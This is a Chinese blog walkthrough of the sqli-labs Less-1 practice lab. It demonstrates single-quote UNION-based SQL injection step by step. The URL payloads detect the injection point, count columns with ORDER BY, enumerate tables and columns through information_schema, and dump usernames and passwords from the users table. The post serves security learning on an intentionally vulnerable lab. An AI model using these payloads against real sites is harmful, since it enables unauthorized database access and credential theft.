---
title: Less-1：单引号字符型 SQL 注入
published: 2026-07-03
description: 记录 sqli-labs Less-1 单引号字符型注入的判断字段数、联合查询回显和 information_schema 查询流程。
tags: [SQL注入, Web安全, sqli-labs, MySQL, 联合查询]
category: 网络安全
draft: false
image: ./less-1-01.png
---

## 一、正常访问

![Less-1 初始页面](./less-1-01.png)

页面提示需要传入一个 `id` 参数：

```text
http://192.168.1.17:8082/Less-1/?id=1
```

![传入 id 参数后的页面](./less-1-02.png)

接着尝试在参数后面添加单引号，判断是否存在注入点：

```text
http://192.168.1.17:8082/Less-1/?id=1'
```

![单引号触发 SQL 报错](./less-1-03.png)

页面返回 SQL 报错，说明传入的单引号参与了后端 SQL 语句拼接。

![SQL 报错信息](./less-1-04.png)

后续可以使用 `--+` 注释掉后面的 SQL 语句，从而消除多余内容导致的语法错误。

## 二、判断查询字段数

使用 `order by` 逐步判断当前查询语句的字段数：

```text
http://192.168.1.17:8082/Less-1/?id=1' order by 1 --+
http://192.168.1.17:8082/Less-1/?id=1' order by 2 --+
http://192.168.1.17:8082/Less-1/?id=1' order by 3 --+
http://192.168.1.17:8082/Less-1/?id=1' order by 4 --+
```

当 `order by 4` 页面报错时，说明当前查询语句只有 3 个字段。

![order by 4 报错](./less-1-05.png)

确认字段数后，再使用 `union select` 判断页面的回显位置：

```text
http://192.168.1.17:8082/Less-1/?id=1' and 1=2 union select 1,2,3 --+
```

![union select 判断回显位置](./less-1-06.png)

从页面结果可以看到，第 2 列和第 3 列会回显到页面上。

## 三、查询数据库信息

先使用 MySQL 自带的 `database()` 函数查询当前数据库名：

```text
http://192.168.1.17:8082/Less-1/?id=1' and 1=2 union select 1,2,database() --+
```

![查询当前数据库名](./less-1-07.png)

再通过 `information_schema.tables` 查询 `security` 数据库中的表名：

```text
http://192.168.1.17:8082/Less-1/?id=1' and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```

这里使用 `group_concat()` 将多个表名合并到同一列中，方便在页面回显位置查看。

![查询 security 数据库中的表名](./less-1-08.png)

接下来以 `users` 表为例，查询该表中的字段名：

```text
http://192.168.1.17:8082/Less-1/?id=1' and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```

![查询 users 表字段名](./less-1-09.png)

可以看到，`users` 表中有 3 个字段，分别是 `id`、`username`、`password`。

最后根据字段名查询表中的数据：

```text
http://192.168.1.17:8082/Less-1/?id=1' and 1=2 union select 1,2,group_concat(username,':',password) from users --+
```

![查询 users 表数据](./less-1-10.png)

通过页面回显，可以获取 `users` 表中的用户名和密码数据。
